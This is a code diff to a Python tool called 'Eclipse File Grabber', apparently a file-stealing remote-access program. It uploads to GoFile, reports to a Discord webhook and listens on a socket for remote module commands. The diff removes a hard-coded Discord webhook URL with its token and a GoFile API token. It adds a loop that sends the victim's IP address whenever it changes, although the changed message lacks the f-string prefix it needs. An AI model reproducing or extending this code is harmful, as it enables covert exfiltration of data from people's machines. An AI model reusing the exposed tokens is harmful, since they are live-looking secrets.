@@ -1,10 +1,11 @@
 # Proudly made by Alderite - https://github.com/alderite
-# Eclipse File Grabber is under the GNU General Public License v3.
+# Eclipse File Grabber is under the GNU General Public License v3 (2007).
 # Credit to https://github.com/Coosta6915/gofile for the gofile API wrapper
 
 import json
 import os
 import shutil
+import time
 import zipfile
 import urllib.request
 from threading import Thread
@@ -13,9 +14,9 @@ import requests
 import socket
 from discord_webhook import DiscordWebhook
 
-__webhook__ = "https://discordapp.com/api/webhooks/954861175873622116/M7JSODllgaJS7K1RvSRCz7NS1NZlR8Ehgj2KglFHTZzpsg-juWf3aLj0H_b3u5S3l4ft"
-__gofileToken__ = "6T5r2QLJLorUFF6XtMX3htsDe15kqxpk"
-__ip__ = '10.28.120.127'
+__webhook__ = ""  # Put your webhook here
+__gofileToken__ = ""  # Put your GoFile token here
+__ip__ = ''  # Put your machines IP here
 
 
 class Util(object):
@@ -201,13 +202,15 @@ class EclipseFileManager():
         this.port = 5475
         this.server_socket.bind((socket.gethostbyname(socket.gethostname()), this.port))
 
-    def getip(this):
-        ip = socket.gethostbyname(socket.gethostname())
+    def checkip(this):
+        prev_ip = None
         while True:
-            if ip != socket.gethostbyname(socket.gethostname()):
-                this.modules.send(f'My ip changed! it is now {socket.gethostbyname(socket.gethostname())}')
-                break
-        this.getip()
+            # Get the current IP address
+            current_ip = socket.gethostbyname(socket.gethostname())
+            if current_ip != prev_ip:
+                this.modules.send("IP address has changed from {prev_ip} to {current_ip}")
+                prev_ip = current_ip
+            time.sleep(60)
 
     def moduleManager(this, data):
         data = data.split("|")
@@ -248,7 +251,7 @@ class EclipseFileManager():
     def Main(this):
         # this.modules.sendTree('C:\\')
         this.modules.send(f'My ip is {socket.gethostbyname(socket.gethostname())}!')
-        Thread(target=this.getip).start()
+        Thread(target=this.checkip).start()
         this.listen()
 
 if __name__ == "__main__":
